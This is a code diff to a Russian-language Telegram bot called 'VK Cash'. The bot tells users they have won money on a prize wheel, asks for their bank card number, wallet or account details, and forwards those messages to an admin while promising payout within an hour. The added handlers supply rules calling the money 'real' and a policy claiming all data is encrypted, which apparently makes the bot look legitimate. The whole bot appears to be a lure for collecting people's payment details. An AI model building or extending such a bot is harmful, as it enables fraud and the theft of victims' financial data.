@@ -83,6 +83,30 @@ def handle_spin(call):
     message_text = f"🎉 *ПОБЕДА {amount}₽!* 🎉\n🎫 Код: `{code}`\n\n💳 Отправьте свои реквизиты:\n— Номер карты (Сбербанк, Тинькофф)\n— Или кошелёк (ЮMoney, Payeer, PayPal)\n— Или банк + номер счёта"
     bot.send_message(call.message.chat.id, message_text, parse_mode="Markdown")
 
+@bot.callback_query_handler(func=lambda call: call.data == "shop")
+def handle_shop(call):
+    bot.send_message(call.message.chat.id, "🛒 Магазин временно закрыт.\nСкоро появятся бонусы и улучшения!")
+
+@bot.callback_query_handler(func=lambda call: call.data == "leaderboard")
+def handle_leaderboard(call):
+    bot.send_message(call.message.chat.id, "🏆 Топ игроков появится здесь позже!")
+
+@bot.callback_query_handler(func=lambda call: call.data == "admin")
+def handle_admin(call):
+    if call.from_user.id != ADMIN_ID:
+        bot.answer_callback_query(call.id, "⛔ Нет доступа.")
+        return
+    bot.send_message(call.message.chat.id, "👑 Добро пожаловать в админ-панель!\nФункции в разработке.")
+
+@bot.callback_query_handler(func=lambda call: call.data in ["rules", "faq", "policy"])
+def handle_info(call):
+    texts = {
+        "rules": "📜 *Правила:*\n1. Один бесплатный шанс\n2. Деньги — реальные\n3. Не обманывать 😉",
+        "faq": "❓ *FAQ:*\n- Как получить VKC?\n  Ответ: Крути колесо и жди свою удачу!",
+        "policy": "📋 *Политика:*\nВсе данные шифруются.\nПроект в развлекательных целях."
+    }
+    bot.send_message(call.message.chat.id, texts[call.data], parse_mode="Markdown")
+
 @bot.message_handler(func=lambda message: True)
 def handle_message(message):
     uid = message.from_user.id
@@ -112,7 +136,6 @@ def handle_message(message):
         bot.send_message(ADMIN_ID, payout_info, reply_markup=markup)
         bot.send_message(uid, "✅ Заявка принята!\n⏳ Ожидайте выплату в течение 1 часа.")
 
-# 🚀 Вот оно — важный маршрут для Webhook:
 @app.route('/', methods=['GET', 'POST'])
 def webhook():
     if request.method == 'POST':
@@ -121,6 +144,5 @@ def webhook():
         return "OK", 200
     return "VK Cash бот работает!", 200
 
-# ⏺ Запуск Flask сервера
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
